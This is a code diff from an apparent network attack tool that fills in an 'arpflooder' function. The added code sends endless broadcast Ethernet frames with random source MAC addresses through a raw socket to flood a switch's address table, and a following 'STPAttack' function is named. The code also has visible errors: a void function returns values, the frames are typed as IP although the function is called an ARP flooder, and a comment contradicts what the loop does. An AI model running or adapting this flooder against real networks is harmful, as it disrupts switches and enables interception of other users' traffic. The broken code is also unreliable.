@@ -79,16 +79,26 @@
 #endif
 
 #include <stdarg.h>
-
 #include <limits.h>
-
 #include <ctype.h>
-
 #include "parser.h"
-/*
+
+
 #include <stdio.h>
-#include <conio.h>
-*/
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <arpa/inet.h>
+#include <netinet/if_ether.h>
+#include <net/if.h>
+#include <netpacket/packet.h> // Include this header file for struct sockaddr_ll
+
+#define DST_MAC "ff:ff:ff:ff:ff:ff"  // Broadcast MAC address
+#define ETH_TYPE 0x0800             // Ethernet Type (IP)
+#define PKT_SIZE 60                 // Packet size (bytes)
+#define INTERFACE "ens33"           // Interface name
 
 static u_int8_t valid_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
 
@@ -102,6 +112,51 @@ static u_int8_t valid_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
 void arpflooder()
 {
    printf("Arp Flooder Starting...\n");
+   int sock, i;
+   char buffer[PKT_SIZE];
+   struct ether_header *eth_hdr;
+   struct sockaddr_ll saddr;
+
+   // Create the socket
+   sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+   if (sock < 0) {
+      perror("socket() failed");
+      return 1;
+   }
+
+   // Bind the socket to the interface
+   memset(&saddr, 0, sizeof(saddr));
+   saddr.sll_family = AF_PACKET;
+   saddr.sll_ifindex = if_nametoindex(INTERFACE);
+   if (bind(sock, (struct sockaddr *)&saddr, sizeof(saddr)) < 0) {
+      perror("bind() failed");
+      return 1;
+   }
+
+   // Fill the Ethernet header
+   eth_hdr = (struct ether_header*)buffer;
+   memset(eth_hdr->ether_dhost, 0xff, ETH_ALEN);  // Broadcast address
+   eth_hdr->ether_type = htons(ETH_TYPE);
+
+   // Flood the switch with packets
+   printf("Flooding switch...\n");
+   while (1) {
+      // Generate a random source MAC address
+      for (i = 0; i < ETH_ALEN; i++) {
+         eth_hdr->ether_shost[i] = rand() % 256;
+      }
+
+      // Send the packet
+      if (send(sock, buffer, PKT_SIZE, 0) < 0) {
+         perror("send() failed");
+         return 1;
+      }
+
+      // Sleep for a short time to avoid overwhelming the switch
+      usleep(10000);
+   }
+
+   return 0;
 }
 
 void STPAttack()
